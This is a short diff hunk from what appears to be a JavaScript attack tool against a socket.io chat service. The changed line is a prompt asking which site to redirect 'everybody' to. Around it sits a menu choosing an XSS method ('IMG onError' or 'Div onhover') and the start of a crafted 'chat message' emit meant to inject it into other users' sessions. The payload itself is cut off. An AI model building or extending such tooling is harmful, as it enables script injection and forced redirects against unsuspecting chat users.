@@ -45,7 +45,7 @@ window.addEventListener("keydown", function(e) {
                           }, 1000)
                     break;
                 case 4:
-                    let site = prompt("What site would you like to redirect the user to?\n\nExample: https://zastix.xyz/")
+                    let site = prompt("What site would you like to redirect everybody to?\n\nExample: https://zastix.xyz/")
                     switch (Number(prompt("What method of XSS?\n\nIMG onError - 1\nDiv onhover - 2"))) {
                         case 1:
                             socket2.emit('chat message', {
